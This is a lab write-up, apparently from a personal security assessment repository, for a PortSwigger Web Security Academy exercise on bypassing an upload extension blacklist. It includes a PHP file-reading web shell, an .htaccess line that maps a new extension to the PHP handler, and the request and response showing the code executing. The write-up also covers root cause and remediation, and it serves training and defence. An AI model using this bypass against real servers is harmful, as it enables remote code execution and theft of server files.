# Extension Blacklist Through Apache .htaccess

## Lab source and scope

This assessment was performed in the PortSwigger Web Security Academy lab **Web shell upload via extension blacklist bypass**.

The app provided an avatar upload feature and attempted to prevent server-side code execution by blocking dangerous file extensions.

## Security objective

Determine whether the extension blacklist could be bypassed by changing the server-side handling of a different, otherwise permitted extension.

## Starting position

I had:

- An authenticated normal user account
- Access to the avatar upload function
- Burp Suite for modifying multipart upload requests
- Knowledge that the target was server by Apache

## Baseline behavior

I first attempted to upload a small PHP file that would read the lab target file:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

The direct `.php` upload was rejected, confirming that the app applied an extension blacklist.

At this stage, the control had blocked on efilename. It had not yet established that upload content could never reach the PHP interpreter.

## Server configuration observation

The HTTP responses identiied Apache as the web server.

Apache can support per-directory configuration thorugh `.htaccess` when the server configuration permits the relevant overrides. This created a second test:

> Can the upload feature write a configuration file into the same directory used to serve uploaded avatars?

## Exploitation

I modified the multipart upload request so the uploaded filename became:

```text
.htaccess
```

The uploaded file contained:

```apache
AddType application/x-httpd-php .hb
```

This instructed the vulnerable lab environment to treat files ending in `.hb` as PHP-handled content.

I them uploaded hte same PHP code using a non-blacklisted filename:

```text
exploit.hb
```

The app accepted the upload.

## Evidence

The uploaded file was reachable from the avatar storage path:

```http
GET /file/avatars/exploit.hb HTTP/2
Host: <LAB_HOST>
```

Instead of returning the PHP source as static text, the server executed it and returned the contents of the target file:

```http
HTTP/2 200 OK
Server: Apache/2.4.41 (Ubuntu)
Conent-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 32

KPAeqBaSNanokEPN8o4WaLVwBz4dV8f9
```

The returned lab secret confirmed server side PHP execution under the attacker controlled extension.

## Result

The upload blacklisted `.php` but did not prevent the attacker from changing hte server's handler mapping for a different extension.

By uploading `.htaccess` and then a file using hte newly mapped `.hb` extension, attacker controlled PHP reached an executable server side context.

## Root cause

The defence focused on blocking known dangerous extensions while leaving two more fundamental conditions unresolved.

1. The upload directory accepted a server configuration file.
2. Files in that directory were served from a context where the web server could execute them.

The vulnerability was therefore a configuration and isolation failure, not simply an incomplete list of blocked extensions.

## Security impact

In a real application, successful server-side code execution through an upload feature could lead to:

- Access to application data and local files
- Theft of credentials or secrets available to the web process
- Modification of application content
- Lateral movement from the web server
- Full server compromise, depending on process privileges and surrounding controls

## Remediation

- Use an allowlist of required file extensions rather than a denylist of dangerous ones.
- Store user uploads outside the executable web root where possible.
- Serve uploaded files from a separate origin or storage service.
- Prevent uploads from creating or replacing `.htaccess`, `web.config`, and other configuration files.
- Disable unnecessary per-directory configuration overrides.
- Rename uploaded files on the server.
- Validate file content using appropriate parsers and signatures.
- Apply restrictive filesystem and process permissions.
- Ensure the upload directory cannot execute scripts.

## What I learned

The extension check initially looked effective because `.php` was blocked. The useful question was broader: “What decides whether this directory executes a file?”

Once the server configuration became part of the attack surface, the blacklist was no longer the real security boundary.

## Navigation

[File upload overview](README.md) | [Assessment index](../../README.md) | [Next: Cross-cutting lessons](../04-cross-cutting-lessons.md)
